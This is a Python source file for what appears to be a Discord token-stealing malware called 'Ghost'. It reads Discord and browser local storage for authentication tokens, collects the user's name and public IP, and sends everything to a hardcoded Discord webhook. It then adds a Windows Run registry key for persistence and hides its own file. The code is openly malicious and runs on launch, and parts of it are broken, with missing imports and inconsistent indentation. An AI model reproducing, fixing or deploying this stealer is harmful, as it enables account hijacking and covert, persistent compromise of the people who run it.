import requests, os, re, subprocess, sys, shutil
from dhooks import Webhook, Embed
from winreg import *

#by f6ll!

class Ghost():
    def __init__(self, *args, **kwargs):
        super(Ghost, self).__init__(*args, **kwargs)

def GhostExtract(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass


def GhostFallback():
    ghostrp = (os.path.join('ghost.py')) 
    ghostlgm = r'C:\ProgramData\ghost.py'
    shutil.move(ghostrp,ghostlgm)

    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'WinProcessTreeLeveldj', 0, REG_SZ,
               new_file_path)

    ghostfile = (os.path.join('ghost.py'))
    ghostopen = os.popen('attrib +h ' + ghostfile)
    ghostread = ghostopen.read()
    ghostopen.close()


def GhostIdentifier():
	ghstidwtf = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(10))

	ghost_identity =  open('ght.txt', 'w')
	ghost_identity.write("The User Identifier is" + ghstidwtf)
    ghost_identity.close()
#still a work in process.
 

def GhostProcess():
    hook = Webhook("https://discord.com/api/webhooks/830185249711063041/VQnjd8PliwisjGEnCtVv2bRi0Af3B4WZnrM2daRmyx23i1kZHn9jg7enHuupTYShLusV")
    user = os.getenv("UserName")
    ghost_getidentity =  open('ght.txt', 'r')
    identifiercode = ghost_getidentity.read()
    ghost_getidentity.close()
    identity = (identifiercode)
    hostname = requests.get("https://api.ipify.org").text 
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',

    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'

        tokens = GhostExtract(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'
        ctmsg = "made by https://github.com/f6ll"


        embed = Embed(title=f' [  Ghost Logged | {user} | {hostname} | Identifier : {identity}  ] ',color=16764108)
        embed.add_field("Creator", ctmsg)
        embed.add_field("Extracted:",message)
        hook.send(embed=embed)
        
GhostProcess()
GhostFallback()
